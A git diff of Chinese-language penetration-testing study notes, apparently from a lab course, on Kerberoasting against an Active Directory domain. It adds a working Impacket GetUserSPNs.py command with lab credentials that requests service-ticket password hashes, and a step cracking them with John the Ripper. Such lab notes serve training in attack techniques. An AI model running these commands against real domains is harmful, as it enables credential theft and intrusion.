@@ -79,6 +79,10 @@ Kerberoasting
     setspn -s http/lpt.com user-one
 ![image](https://github.com/user-attachments/assets/fbca5919-1e5d-4a1f-9fff-c59e2e07dcd5)
   
-    取得在DC上註冊的服務
+    取得在DC上註冊的服務&密碼HASH
+    GetUserSPNs.py 'lpt.com/cpent:Pa$$w0rd' -dc-ip 192.168.177.19 -request -outputfile kerberoast.txt
 ![image](https://github.com/user-attachments/assets/f4ca12aa-9f57-4d1d-a892-6f0576e95622)
+![image](https://github.com/user-attachments/assets/eceb82db-8e93-47f4-a09f-5f5c7a76c27b)
 
+    使用john破解user-one密碼
+![image](https://github.com/user-attachments/assets/cad67771-346f-4b44-83af-8625d293407f)
